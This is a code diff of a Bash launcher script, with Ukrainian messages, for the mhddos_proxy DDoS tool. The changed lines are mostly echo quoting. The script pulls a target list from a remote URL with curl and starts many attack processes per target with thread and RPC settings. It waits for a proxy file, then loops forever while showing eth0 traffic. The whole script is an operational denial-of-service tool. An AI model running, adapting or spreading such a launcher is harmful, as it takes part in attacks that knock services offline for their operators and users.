@@ -9,7 +9,7 @@ set -o errexit -o pipefail -o noclobber -o nounset
 # -use return value from ${PIPESTATUS[0]}, because ! hosed $?
 ! getopt --test > /dev/null
 if [[ ${PIPESTATUS[0]} -ne 4 ]]; then
-    echo 'На жаль, `getopt --test` завершився з помилкою. Будь ласка, встановіть enhanced getopt.'
+    echo "На жаль, `getopt --test` завершився з помилкою. Будь ласка, встановіть enhanced getopt."
     exit 1
 fi
 
@@ -96,11 +96,11 @@ python3 -m pip install -r requirements.txt &> /dev/null
 while true
 do
     # kill old copies of mhddos_proxy
-    echo -e "DDoS (ре)стартує. Завершення попередніх процесів..."
+    echo "DDoS (ре)стартує. Завершення попередніх процесів..."
     if pgrep -f runner.py &> /dev/null; then pkill -f runner.py &> /dev/null; fi
     if pgrep -f ./start.py &> /dev/null; then pkill -f /start.py &> /dev/null; fi
     if pgrep -f ifstat &> /dev/null; then pkill -f ifstat &> /dev/null; fi
-    echo -e "DDoS (ре)стартує. Завершення попередніх процесів... ГОТОВО!"
+    echo "DDoS (ре)стартує. Завершення попередніх процесів... ГОТОВО!"
 
     # delete old proxy file if present
     if [ -f $PROXY_FILE ]; then
@@ -109,7 +109,7 @@ do
 
     # load targets and process them one-by-one
     curl -s $url_with_targets | cat | grep "^[^#]" | while read -r target_command ; do
-      echo -e "Запускаємо $process_count процесів для атаки $target_command -t $thread_count -p 25200 --rpc 1000"
+      echo "Запускаємо $process_count процесів для атаки $target_command -t $thread_count -p 25200 --rpc 1000"
 
       for (( i=1; i<=process_count; i++ ))
       do
@@ -118,23 +118,22 @@ do
 
           # wait till the first process initializes proxy file properly
           if [ ! -f $PROXY_FILE ]; then
-              echo -e "Підготовка та перевірка проксі. Це може зайняти декілька хвилин..."
+              echo "Підготовка та перевірка проксі. Це може зайняти декілька хвилин..."
 
               while [ ! -f $PROXY_FILE ]
               do
                   sleep 1
               done
 
-              echo -e "Підготовка та перевірка проксі. Це може зайняти декілька хвилин... ГОТОВО!"
+              echo "Підготовка та перевірка проксі. Це може зайняти декілька хвилин... ГОТОВО!"
           fi
       done
   done
 
-  echo -e "DDoS атака почалася. Активовано моніторинг трафіку на інтерфейсі eth0 (відображається поточний час, вхідна та вихідна швидкість у MB за секунду).\nНаступна перевірка цілей відбудеться через $refresh_interval\n"
-
   ifstat -i eth0 -t -b -n $stats_interval/$stats_interval | awk '$1 ~ /^[0-9]{2}:/{$2/=1024;$3/=1024;printf "[%s] %10.2f ↓MBit/s↓  %10.2f ↑MBit/s↑\n",$1,$2,$3}'&
 
+  echo -e "DDoS атака почалася. Активовано моніторинг трафіку на інтерфейсі eth0 (відображається поточний час, вхідна та вихідна швидкість у MB за секунду).\nНаступна перевірка цілей відбудеться через $refresh_interval\n"
+
   sleep $refresh_interval
-  clear
 
 done
